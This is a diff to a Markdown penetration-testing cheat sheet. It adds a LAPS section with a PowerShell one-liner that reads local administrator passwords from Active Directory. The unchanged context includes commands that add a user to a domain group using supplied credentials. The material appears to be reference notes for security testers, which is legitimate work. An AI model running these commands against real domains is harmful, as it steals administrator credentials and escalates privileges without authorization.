@@ -43,6 +43,7 @@ Table of Contents
       * [Uploading Malicious Packages to PyPi Server](#uploading-malicious-packages-to-pypi-server)
    * [Active Directory](#active-directory)
       * [Bloodhound](#bloodhound)
+      * [LAPS](#laps)
    * [Pivoting](#pivoting)
       * [Local Port Forward with Netsh](#local-port-forward-with-netsh)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
@@ -487,6 +488,12 @@ Adding a user into the target Group:
 $user_password = ConvertTo-SecureString __UserPassword__ -Asplain -Force
 $credential = New-Object System.Management.Automation.PSCredential('__Domain__\__UserName__', $user_password)
 Add-DomainGroupMember -Identity __TargetGroup__ -Members __UserName__ -Credential $credential
+```
+
+## LAPS
+If you have enough permissions (GenericAll, ExtendedRights, ReadLAPSPassword), you can read the local administrator's passwords using this command:
+```powershell
+((New-Object system.directoryservices.directorysearcher "name=__COMPUTER__").FindOne()).Properties['ms-mcs-admpwd']
 ```
 
 # Pivoting
